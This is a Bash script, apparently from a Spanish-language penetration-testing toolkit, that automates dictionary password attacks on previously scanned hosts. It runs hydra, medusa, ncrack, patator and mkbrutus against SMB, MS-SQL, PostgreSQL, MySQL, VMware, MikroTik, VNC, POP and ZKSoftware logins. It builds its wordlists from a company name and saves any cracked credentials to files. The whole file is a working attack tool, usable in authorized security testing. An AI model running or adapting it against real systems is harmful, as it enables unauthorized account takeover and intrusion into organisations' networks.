#!/bin/bash
# Author: Daniel Torres
# daniel.torres@owasp.org

THREADS="30"
OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
                            

max_ins=10

echo -e '  ______                  _                         __   ______ '
echo -e ' / _____)                | |                       /  | / __   |'
echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
echo ''
echo '									   daniel.torres@owasp.org'
															
echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"



while getopts ":e:d:h:" OPTIONS
do
            case $OPTIONS in
            e)     ENTIDAD=$OPTARG;;
            d)     DICTIONARY=$OPTARG;;            
            ?)     printf "Opcion invalida: -$OPTARG\n" $0
                          exit 2;;
           esac
done

ENTIDAD=${ENTIDAD:=NULL}
DICTIONARY=${DICTIONARY:=NULL}


if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 

cat << "EOF"

Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)

Opciones: 
-e : Nombre de la empresa (Usado para generar diccionario de passwords)
 
-d :Diccionario de passwords a usar (opcional)

Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
	cracker.sh -e microsoft

Ejemplo 2: Ataque de diccionario con lista de passwords
	cracker.sh -d passwords.txt
EOF

exit
fi
######################

rm enumeration/* 2>/dev/null
rm vulnerabilities/* 2>/dev/null

if [ $DICTIONARY = NULL ] ; then

	echo $ENTIDAD > base.txt
	passGen.sh -f base.txt -t top20 -o top.txt 
	rm base.txt
else
	mv $DICTIONARY top.txt	

fi

echo "postgres" >> top.txt	
echo "mysql" >> top.txt	


if [ -f .services/Windows.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios SMB activos (Windows). Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### Windows auth ######################$RESET"	    
	 for ip in $(cat .services/Windows.txt); do		
		echo -e "\n\t########### $ip #######"	
		hostlive=`nmap -n -Pn -p 445 $ip`
		if [[ ${hostlive} == *"open"*  ]];then 
		
			hydra -l administrador -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l administrator -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l soporte -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l sistemas -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null
			hydra -l $entidad -P top.txt -t 1 $ip smb | tee -a  logs/cracking/$ip-windows.txt 2>/dev/null		
			grep --color=never 'password:' logs/cracking/$ip-windows.txt > vulnerabilities/$ip-windows-password.txt
			
			#https://github.com/m4ll0k/SMBrute (shared)
		
		else
			echo "Equipo apagado"
		fi
								
		
		
	 done	
   fi # if bruteforce
fi



if [ -f .services/ZKSoftware.txt ]
then

	echo -e "\n\t $OKBLUE Encontre servicios de ZKSoftware activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
		then       	 
      	  
		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
		for ip in $(cat .services/ZKSoftware.txt); do
			echo -e "\n\t########### $ip #######"			
			passWeb.pl -t $ip -p 80 -s ZKSoftware -f top.txt > vulnerabilities/$ip-80-password.txt
			echo ""			
		done
	 fi	
fi


if [ -f .services/mssql.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios MS-SQL activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### MS-SQL ######################$RESET"	    
	 for line in $(cat .services/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		medusa -e n -u sa -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
		medusa -e n -u adm -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
		medusa -e n -u $entidad -P top.txt -h $ip -M mssql | tee -a  logs/cracking/$ip-mssql.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-mssql.txt > vulnerabilities/$ip-mssql-password.txt
		
	 done	
   fi # if bruteforce
fi


if [ -f .services/postgres.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios postgres activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	  if [ $bruteforce == 's' ]
      then 

	 echo -e "$OKBLUE\n\t#################### postgres ######################$RESET"	    
	 for line in $(cat .services/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo -e "\n\t########### $ip #######"							
		medusa -e n -u postgres -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
		medusa -e n -u $entidad -P top.txt -h $ip -M postgres | tee -a  logs/cracking/$ip-postgres.txt
		
		grep --color=never SUCCESS logs/cracking/$ip-postgres.txt > vulnerabilities/$ip-postgres-password.txt
		
	 done	
   fi # if bruteforce
fi


if [ -f .services/MikroTik.txt ]
then
	echo -e "\n\t $OKBLUE Encontre dispositivos MikroTik. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
	  for ip in $(cat .services/MikroTik.txt); do		
		echo -e "\n\t########### $ip #######"			
				
		mkbrutus.py -t $ip -u admin -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
		mkbrutus.py -t $ip -u $entidad -d top.txt | tee -a  logs/cracking/$ip-MikroTik.txt
		
		echo ""			
	 done
	fi # if bruteforce
fi

if [ -f .services/vmware.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  for line in $(cat .services/vmware.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"			
		medusa -e n -u root -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt	
		medusa -e n -u $entidad  -P top.txt -h $ip -M vmauthd | tee -a  logs/cracking/$ip-vmware.txt
		grep --color=never SUCCESS logs/cracking/$ip-vmware.txt > vulnerabilities/$ip-vmware-password.txt
		echo ""			
	 done
	fi # if bruteforce
fi

if [ -f .services/mysql.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de MySQL activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then        	
		echo -e "$OKBLUE\n\t#################### Testing common pass MYSQL (lennnto) ######################$RESET"	
		for line in $(cat .services/mysql.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			echo -e "\n\t########### $ip #######"			
			hostlive=`nmap -n -Pn -p 3306 $ip`
			if [[ ${hostlive} == *"open"*  ]];then   	  
				medusa -e n -u root -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt 2>> logs/cracking/$ip-mysql.txt
				medusa -e n -u mysql -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
				medusa -e n -u $entidad  -P top.txt -h $ip -M mysql | tee -a  logs/cracking/$ip-mysql.txt
				grep --color=never SUCCESS logs/cracking/$ip-mysql.txt > vulnerabilities/$ip-mysql-password.txt
				echo ""			
			else
				echo "Host apagado"
			fi
			
			
		done		
	fi # if bruteforce
fi



if [ -f .services/vnc.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de VNC activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then      	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
	  for line in $(cat .services/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"					
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -lt $max_ins ] #Max 10 instances
		then
			ncrack --user 'administrador' -P top.txt -p $port -g cd=8 $ip | tee -a  logs/cracking/$ip-vnc-password.txt &			
			echo ""		
		else
			echo "Max instancias de ncrack ($max_ins)"
			sleep 10;
				
		fi		
		
	  done
	  
	  sleep 5
	  ### wait to finish
	  while true; do
		ncrack_instances=`pgrep ncrack | wc -l`
		if [ "$ncrack_instances" -gt 0 ]
		then
			echo "Todavia hay escaneos de ncrack activos ($ncrack_instances)"  
			sleep 30
		else
			break		  		 
		fi				
	  done
	
	  echo -e "\n\t########### Checking success #######"	
	  for line in $(cat .services/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
						
		grep --color=never "administrador" logs/cracking/$ip-vnc-password.txt > vulnerabilities/$ip-vnc-password.txt
		echo ""			
	  done
	 
	 
	 
	 
	fi # if bruteforce
fi



if [ -f .services/pop.txt ]
then
	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
	read bruteforce	  
	  
	if [ $bruteforce == 's' ]
    then     			
      echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? $RESET"	  
	  read users_file  	  
	  
	  echo -e "$OKBLUE\n\t#################### Testing common pass POP (lennnto) ######################$RESET"	
	  for line in $(cat .services/pop.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "\n\t########### $ip #######"	
		for username in $(cat $users_file); do
			echo -e "\n\t########### Testing user $username #######"			
			echo $username > base.txt
			passGen.sh -f base.txt -t top20 -o passwords2.txt
			cat passwords2.txt top.txt | sort | uniq > passwords.txt
			rm passwords2.txt
			patator.py pop_login host=$ip user=$username password=FILE0 0=passwords.txt | tee -a logs/cracking/$ip-pop.txt	
			#grep --color=never SUCCESS logs/cracking/$ip-pop.txt > vulnerabilities/$ip-pop-password.txt
			echo ""			
		done			
		
		echo ""			
	 done
	fi # if bruteforce
fi
	

insert-data.py




